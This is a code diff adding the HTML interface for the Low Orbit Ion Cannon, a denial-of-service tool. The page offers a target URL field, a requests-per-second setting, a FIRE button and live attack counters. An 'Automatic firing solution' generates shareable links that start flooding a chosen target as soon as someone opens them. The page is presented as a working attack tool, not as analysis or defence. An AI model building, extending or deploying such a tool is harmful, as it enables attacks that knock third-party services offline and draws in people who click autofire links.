@@ -1,0 +1,189 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<html>
+    <head>
+        <title>LOIC</title>
+
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="viewport" content="width=device-width,user-scalable=no">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+        <link rel="apple-touch-icon-precomposed" href="dashicon.png">
+        <link rel="apple-touch-startup-image" href="dashload.png">
+
+        <link href="interface.css" rel="stylesheet" type="text/css">
+
+        <script src="LOIC.js" type="text/javascript"></script>
+        <script type="text/javascript">
+        	function ellipsis(){
+        		//lastOnline = -1;
+        		//checkNetwork();
+        		window.scrollTo(0,1);
+
+        		LOIC.displayHeat(document.getElementById("heat"));
+        		LOIC.displayBusy(document.getElementById("busy"));
+        		LOIC.displayCompleted(document.getElementById("success"));
+
+        		document.getElementById("fire").onclick = startCannon;
+        		document.getElementById("clear").onclick = LOIC.clear;
+        	}
+
+        	function checkNetwork(){
+        		online = navigator.onLine ? 1 : 0;
+        		if(online != lastOnline){
+        			lastOnline = online;
+        			cacheStatusBar = document.getElementById("cachebar");
+        			cacheStatusText = document.getElementById("cachestatus");
+        			if(online == 1){
+        				if(window.applicationCache){
+        					window.applicationCache.update();
+        					cacheStatus();
+        				}
+        			}
+        			else{
+        				cacheStatusText.innerText = "No internet connection";
+        				cacheStatusBar.style.display = "block";
+        			}
+        		}
+        		window.setTimeout(checkNetwork, 5000);
+        	}
+
+        	function cacheStatus(){
+        		cacheStatusBar = document.getElementById("cachebar");
+        		cacheStatusText = document.getElementById("cachestatus");
+        		appcache = window.applicationCache;
+
+        		/*
+        		 * Status 0: Uncached
+        		 * Status 1: Idle (up-to-date)
+        		 * Status 2: Checking
+        		 * Status 3: Downloading
+        		 * Status 4: Updateready
+        		 * Status 5: Obsolete (invalid cache removed)
+        		 */
+
+        		if(appcache.status == 3){
+        			cacheStatusText.innerText = "Updating application...";
+        			cacheStatusBar.style.display = "block";
+        		}
+        		else if(appcache.status == 4){
+        			appcache.swapCache();
+        			cacheStatusBar.style.display = "none";
+        		}
+        		else if(appcache.status == 1){ //because status 4 doesn't fire in normal browser
+        			cacheStatusBar.style.display = "none";
+        		}
+
+        		if(appcache.status == 2 || appcache.status == 3 || appcache.status == 4){
+        			window.setTimeout(cacheStatus,10);
+        		}
+        	}
+
+        	function startCannon(){
+        		LOIC.brief(
+        			document.getElementById("target").value,
+        			document.getElementById("message").value,
+        			document.getElementById("rps").value
+        		);
+        		firebutton = document.getElementById("fire");
+        		if(LOIC.toggleFire()){
+        			firebutton.innerHTML = "STOP";
+        			firebutton.className = "button buttonstop";
+        		}
+        		else{
+        			firebutton.innerHTML = "FIRE";
+        			firebutton.className = "button";
+        		}
+        	}
+        	function createSolution(){
+        		url = window.location.protocol + "//" + window.location.host + window.location.pathname;
+        		url = url + "?autofire&";
+        		url = url + "target=" + escape(document.getElementById("target").value) + "&";
+        		if(document.getElementById("message").value != ""){
+        			url = url + "message=" + escape(document.getElementById("message").value) + "&";
+        		}
+        		url = url + "rps=" + escape(document.getElementById("rps").value);
+
+        		document.getElementById("solution").setAttribute("href",url);
+        		document.getElementById("solutionTooltip").innerText = "Copy or drag link";
+        		if(typeof solutionTimer != "undefined"){
+        			window.clearTimeout(solutionTimer);
+        		}
+        		solutionTimer = window.setTimeout('document.getElementById("solutionTooltip").innerText = "Click to generate"',5000);
+        	}
+        	firstEnter = true;
+        	function checkKey(event){
+        		if(firstEnter){
+        			firstEnter = false;
+        		}
+        		else{
+        			//window.alert(event.keyCode);
+        			if(event.keyCode == 13){
+        				startCannon();
+        			}
+        		}
+        	}
+        	window.onload = ellipsis;
+        </script>
+
+    </head>
+
+    <body onKeyPress="checkKey(event)">
+
+        <div class="cachebar" id="cachebar"><span id="cachestatus"></span></div>
+
+        <center>
+            <div class="wrap">
+
+                <h1>Low Orbit Ion Cannon</h1>
+
+                <label for="target">Target</label><br>
+                <input type="text" name="target" id="target" class="field" value="http://">
+
+                <br><br>
+
+                <div class="sidebyside">
+                    <label for="message">Message (optional)</label><br>
+                    <input type="text" name="message" id="message" class="field" value="" style="width: 197px; margin-right: 5px;">
+                </div><div class="sidebyside">
+                    <label for="rps">RPS</label><br>
+                    <input type="text" name="rps" id="rps" class="field" value="10" maxlength="4" style="width: 40px; text-align: center;">
+                </div>
+
+                <br><br><br>
+
+                <center>
+
+                    <div class="stats">
+                        <label for="heat">&nbsp;Heat&nbsp;</label><br>
+                        <b class="red"><span id="heat">0</span></b>
+                    </div>
+
+                    <div class="stats">
+                        <label for="heat">&nbsp;Busy&nbsp;</label><br>
+                        <b class="blue"><span id="busy">0</span></b>
+                    </div>
+
+                    <div class="stats">
+                        <label for="heat">Completed</label><br>
+                        <b class="green"><span id="success">0</span></b>
+                    </div>
+
+                </center>
+
+                <br><br>
+
+                <div class="button" id="fire">FIRE</div>
+
+                <div class="button buttonclear" id="clear">CLEAR</div>
+
+                <br><br>
+
+                <a href="#" onclick="createSolution(); return false" id="solution">Automatic firing solution</a><i> &rsaquo; <span id="solutionTooltip">Click to generate</span></i>
+
+            </div>
+        </center>
+
+    </body>
+
+</html>
